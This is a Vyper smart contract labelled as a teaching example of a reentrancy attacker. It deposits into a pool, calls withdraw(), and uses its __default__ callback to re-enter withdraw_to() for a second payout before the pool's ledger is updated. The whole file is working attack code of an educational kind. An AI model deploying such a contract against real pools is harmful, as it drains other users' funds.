# pragma version ^0.4.0
# TEACHING EXAMPLE. Do not deploy. See README.md.
#
# Deposits 1 unit, calls withdraw(), and when the payout runs this contract's
# __default__ (only a native-asset payout does), re-enters through withdraw_to()
# for a second payout before the ledger is zeroed. Against an ERC20 asset pool the
# payout never calls back, so __default__ never fires and `reentered` stays False.

interface Pool:
    def deposit(amount: uint256): payable
    def withdraw(): nonpayable
    def withdraw_to(recipient: address): nonpayable

interface ERC20:
    def approve(spender: address, amount: uint256) -> bool: nonpayable

POOL: immutable(address)
ASSET: immutable(address)   # empty for the native-asset pool
reentered: public(bool)


@deploy
def __init__(_pool: address, _asset: address):
    """
    @notice Point the attacker at a pool.
    @param _pool The pool to attack.
    @param _asset The pool's ERC20 asset, or the empty address if it pays the native asset.
    """
    POOL = _pool
    ASSET = _asset


@external
@payable
def attack(amount: uint256 = 0):
    """
    @notice Deposit into the pool and immediately call withdraw().
    @dev For the native-asset pool the deposit forwards msg.value; for the ERC20
         asset pool it approves and deposits `amount`.
    @param amount Amount to deposit for the ERC20 asset pool; ignored when native.
    """
    if ASSET == empty(address):
        extcall Pool(POOL).deposit(0, value=msg.value)
    else:
        extcall ERC20(ASSET).approve(POOL, amount)
        extcall Pool(POOL).deposit(amount)

    extcall Pool(POOL).withdraw()


@external
@payable
def __default__():
    """
    @notice Re-entry hook, run by a native-asset payout's callback.
    @dev On the first callback it re-enters withdraw_to() for a second payout while
         the pool's ledger still shows the old balance.
    """
    if not self.reentered:
        self.reentered = True
        extcall Pool(POOL).withdraw_to(self)
